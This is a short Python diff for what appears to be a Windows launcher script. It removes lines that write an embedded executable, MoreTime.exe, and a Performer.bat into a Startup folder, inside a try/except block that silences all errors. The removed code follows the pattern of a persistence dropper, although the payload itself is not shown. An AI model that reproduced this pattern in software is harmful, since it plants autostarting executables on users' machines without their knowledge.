@@ -1,7 +1,6 @@
 from os import system, environ, startfile
 from os.path import exists
 from time import sleep
-from library_data import MoreTime_code, Performer_code
 
 
 try:
@@ -19,9 +18,6 @@ try:
         elif(exists(path_MoreTime_2) and exists(path_MoreTime_2_2)):
             startfile(path_MoreTime_2)
         else:
-            with open(file=destination + "\\MoreTime.exe", mode='wb') as f:
-                f.write(MoreTime_code())
-            with open(file=destination + "\\Startup\\Performer.bat", mode="w", encoding="utf-8") as f:
-                f.write(Performer_code())
+            break
 except:
     pass
